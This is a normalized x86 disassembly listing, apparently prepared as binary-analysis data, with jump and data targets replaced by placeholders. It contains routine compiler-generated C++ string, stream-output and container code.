push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_4045e8
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_4016e0
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_406330
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_401ea0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_401ea0
pop esi
pop ebx
pop ebp
retn 0x8
sub_402100
push ebp
mov ebp esp
push 0xffffffff
push sub_4135c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] 0x0
lea ecx [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov esi [ ebp + 0x8 ]
sub eax ecx
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + esi + 0x24 ]
mov eax [ edx + esi + 0x20 ]
xor edi edi
test ecx ecx
jl r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
jg r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax + 0x4 ]
call edx
cmp ecx edi
jl r-xdata
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
test eax eax
je r-xdata
jg r-xdata
mov eax [ eax + esi + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x4 ] 0x2
cmp eax 0x40
je r-xdata
mov edx 0x4
jmp r-xdata
mov ecx eax
call sub_401890
sub eax [ ebp - 0x18 ]
sbb ecx edi
mov ebx eax
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
mov edx [ ebp - 0x18 ]
mov eax [ ecx ]
mov eax [ eax + 0x24 ]
xor edi edi
push edi
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
cmp eax [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edx edx
je r-xdata
mov edx [ edx + esi + 0x38 ]
mov [ ebp - 0x28 ] esi
test edx edx
je r-xdata
mov [ ebp - 0x14 ] 0x4
cmp edx edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_407fd7
mov edi [ ebp - 0x28 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov al [ ecx + esi + 0x40 ]
mov ecx [ ecx + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
je r-xdata
mov ecx edi
call sub_401990
push 0x0
push eax
call sub_4012c0
or eax 0x4
jg r-xdata
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov al [ ecx + esi + 0x40 ]
mov ecx [ ecx + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
test ebx ebx
je r-xdata
add ebx 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ecx ] edi
mov [ edx ] al
movzx eax al
jmp r-xdata
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
add ebx 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
jmp r-xdata
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ecx ] edi
mov [ edx ] al
movzx eax al
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_402366
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
add eax ecx
mov ecx [ eax + 0xc ]
or ecx 0x4
cmp [ eax + 0x38 ] 0x0
jne r-xdata
and ecx 0x17
mov [ eax + 0xc ] ecx
test [ eax + 0x10 ] ecx
jne r-xdata
or ecx 0x4
push 0x0
push 0x0
call sub_406c8a
int3
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_4023b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4135f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi ]
push edi
mov edi [ eax + 0x10 ]
mov eax [ ecx + 0x4 ]
mov edx [ eax + esi + 0x24 ]
mov ecx [ eax + esi + 0x20 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] edi
test edx edx
jl r-xdata
mov [ ebp - 0x14 ] 0x0
jg r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] edi
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
cmp ecx edi
jbe r-xdata
test ecx ecx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] edi
sete cl
mov [ ebp - 0x20 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
sub ecx edi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov eax [ eax + esi + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x4 ] 0x2
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
mov ecx eax
call sub_401890
mov eax [ eax + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x24 ] esi
cmp eax edi
je r-xdata
mov ebx [ ebp - 0x18 ]
cmp [ ebp - 0x14 ] edi
jbe r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
mov edx [ ecx ]
push edi
push [ ebp - 0x1c ]
push eax
mov eax [ edx + 0x24 ]
call eax
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ eax ]
mov ebx [ ebp - 0x18 ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
lea ecx [ eax + esi ]
mov al [ ecx + 0x40 ]
mov ecx [ ecx + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_407fd7
mov edi [ ebp - 0x24 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
cmp edx edi
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov edi edi
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] edi
jle r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
je r-xdata
mov ecx edi
call sub_401990
push 0x0
push eax
call sub_4012c0
or eax 0x4
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov al [ ecx + esi + 0x40 ]
mov ecx [ ecx + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
mov ebx [ ebp - 0x18 ]
or ebx 0x4
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea ebx [ edx + 0x1 ]
mov [ ecx ] ebx
mov [ edx ] al
movzx eax al
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ ecx ]
movzx eax al
push eax
mov eax [ edx + 0xc ]
call eax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
cmp ebx edi
je r-xdata
cmp eax 0xffffffff
jne r-xdata
dec [ ebp - 0x14 ]
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ edx ]
mov ecx [ ecx + 0x24 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ecx ] edi
mov [ edx ] al
movzx eax al
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_4025f1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
add eax ecx
mov ecx [ eax + 0xc ]
or ecx 0x4
cmp [ eax + 0x38 ] 0x0
jne r-xdata
and ecx 0x17
mov [ eax + 0xc ] ecx
test [ eax + 0x10 ] ecx
jne r-xdata
or ecx 0x4
push 0x0
push 0x0
call sub_406c8a
int3
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_402640
push ebp
mov ebp esp
push 0xffffffff
push sub_413610
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
sub eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x14 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
mov bl [ ebx ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
push 0x1
push eax
call sub_4018e0
test al al
je r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_4045e8
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4045e8
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_4016e0
test edi edi
je r-xdata
mov [ eax + edi ] 0x0
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov eax esi
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi ]
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax + edi ] 0x0
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_4026fd
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_406c8a
mov edx [ esi ]
push edx
call sub_406807
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov eax esi
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi ]
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax + edi ] 0x0
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
mov bl [ ebx ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_4045e8
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4045e8
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_4016e0
test edi edi
je r-xdata
inc [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
jmp r-xdata
sub_4027a0
push ebp
mov ebp esp
push 0xffffffff
push sub_413638
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
mov esi ecx
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x20 ] esi
cmp ecx edi
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] edi
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] edi
sete cl
mov [ ebp - 0x1c ] cl
mov ebx 0x1
mov [ ebp - 0x4 ] ebx
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov ecx [ eax + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
mov [ ebp - 0x4 ] 0x2
je r-xdata
lea edi [ ebx + 0x3 ]
jmp r-xdata
mov ecx eax
call sub_401890
movzx eax [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0xc ]
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
lea edi [ eax + 0x5 ]
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
movzx eax cl
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_407fd7
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + esi + 0x38 ]
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
je r-xdata
mov ecx esi
call sub_401990
push 0x0
push eax
call sub_4012c0
or eax 0x4
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
sub_402866
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
add eax ecx
mov ecx [ eax + 0xc ]
or ecx 0x4
cmp [ eax + 0x38 ] 0x0
jne r-xdata
and ecx 0x17
mov [ eax + 0xc ] ecx
test [ eax + 0x10 ] ecx
jne r-xdata
or ecx 0x4
push 0x0
push 0x0
call sub_406c8a
int3
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_402910
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0xa
mov ecx esi
call sub_4027a0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_4012c0
or eax 0x4
sub_402970
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] al
call sub_401ea0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4029a0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
add ecx 0x1c
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] al
call sub_401ea0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4029d0
push ebp
mov ebp esp
push 0xffffffff
push sub_413660
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push esi
mov esi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x44 ]
push eax
mov ecx esi
call sub_4029a0
mov edi eax
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_402970
mov esi [ ebp + 0x8 ]
push r--data
push edi
push r--data
push eax
push r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_402100
add esp 0x8
push eax
call sub_4023b0
add esp 0x8
push eax
call sub_402100
add esp 0x8
push eax
call sub_4023b0
add esp 0x8
push eax
call sub_402100
mov edi 0x10
add esp 0x8
cmp [ ebp - 0x14 ] edi
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
cmp [ ebp - 0x30 ] edi
jb r-xdata
mov edx [ ebp - 0x28 ]
push edx
call sub_406807
add esp 0x4
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x44 ]
push eax
call sub_406807
add esp 0x4
sub_402aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_41370c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xac
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
lea eax [ ebp - 0xb8 ]
xor ebx ebx
push eax
mov ecx edi
mov [ ebp - 0x10 ] ebx
call sub_4029a0
mov esi eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] ebx
push ecx
mov ecx [ ebp + 0x8 ]
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
call sub_4029a0
cmp [ esi + 0x14 ] 0x10
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x4 ] ebx
mov ebx 0x3
mov [ ebp - 0x10 ] ebx
jb r-xdata
mov edx [ eax + 0x10 ]
push ecx
push esi
push edx
push 0x0
mov ecx eax
call sub_401450
test eax eax
js r-xdata
mov esi [ esi ]
mov [ ebp + 0xb ] 0x1
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_4029a0
mov esi eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] 0x7
call sub_4029a0
cmp [ esi + 0x14 ] 0x10
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x4 ] ebx
mov ebx 0xf
mov [ ebp - 0x10 ] ebx
jb r-xdata
mov esi 0xf
and ebx 0xffffffdf
cmp [ ebp - 0x88 ] 0x10
jb r-xdata
mov edx [ eax + 0x10 ]
push ecx
push esi
push edx
push 0x0
mov ecx eax
call sub_401450
test eax eax
jne r-xdata
mov esi [ esi ]
test bl 0x8
je r-xdata
and ebx 0xffffffef
cmp [ ebp - 0x50 ] 0x10
jb r-xdata
mov esi 0xf
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_406807
add esp 0x4
mov [ ebp + 0xb ] 0x0
jmp r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov ecx edi
call sub_402970
mov esi eax
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x1f
call sub_402970
cmp [ esi + 0x14 ] 0x10
mov ecx [ esi + 0x10 ]
mov ebx 0x3f
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x10 ] ebx
jb r-xdata
test bl 0x4
je r-xdata
and ebx 0xfffffff7
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x64 ]
push ecx
call sub_406807
add esp 0x4
test bl 0x10
je r-xdata
xor edi edi
test bl 0x20
je r-xdata
mov edx [ eax + 0x10 ]
push ecx
push esi
push edx
push 0x0
mov ecx eax
call sub_401450
test eax eax
js r-xdata
mov esi [ esi ]
test bl 0x2
je r-xdata
and ebx 0xfffffffb
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
mov edx [ ebp - 0x2c ]
push edx
call sub_406807
add esp 0x4
pop edi
pop esi
test bl 0x1
pop ebx
je r-xdata
and ebx 0xfffffffd
cmp [ ebp - 0x6c ] 0x10
jb r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x48 ]
push eax
call sub_406807
add esp 0x4
mov ecx [ ebp - 0xc ]
mov al [ ebp + 0xb ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0xa4 ] 0x10
jb r-xdata
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] 0x0
mov ecx [ ebp - 0x80 ]
push ecx
call sub_406807
add esp 0x4
mov edx [ ebp - 0xb8 ]
push edx
call sub_406807
add esp 0x4
sub_402ce0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_402000
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402d20
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ esi + 0x30 ] 0x10
jb r-xdata
mov [ esi + 0x30 ] 0xf
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_406807
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
pop ebp
retn
mov ecx [ esi ]
push ecx
call sub_406807
add esp 0x4
sub_402d70
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
push ebx
push esi
push edi
cmp eax 0x4924923
jb r-xdata
mov edi [ ebp + 0x14 ]
inc eax
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov edx [ ecx + 0x4 ]
cmp eax edx
jne r-xdata
mov esi [ ebp + 0x14 ]
mov ebx 0x10
cmp [ esi + 0x3c ] ebx
jb r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ edx + 0x4 ] edi
mov edx [ ecx + 0x4 ]
mov [ edx ] edi
mov eax [ ecx + 0x4 ]
mov [ eax + 0x8 ] edi
jmp r-xdata
mov edi 0xf
mov [ esi + 0x3c ] edi
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x28 ] 0x0
cmp [ esi + 0x20 ] ebx
jb r-xdata
mov eax [ esi + 0x28 ]
push eax
call sub_406807
add esp 0x4
mov [ eax + 0x8 ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ eax ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov edx [ edi + 0x4 ]
cmp [ edx + 0x44 ] 0x0
mov eax edi
mov bl 0x1
jne r-xdata
mov [ esi + 0x20 ] edi
mov [ esi + 0x1c ] 0x0
push esi
mov [ esi + 0xc ] 0x0
call sub_406807
add esp 0x4
push r--data
call sub_4045e8
mov ecx [ esi + 0xc ]
push ecx
call sub_406807
add esp 0x4
mov [ edx + 0x8 ] edi
mov [ edx ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
pop esi
mov [ ecx + 0x44 ] bl
pop ebx
pop ebp
retn 0x10
mov edx [ eax + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
mov esi [ esi ]
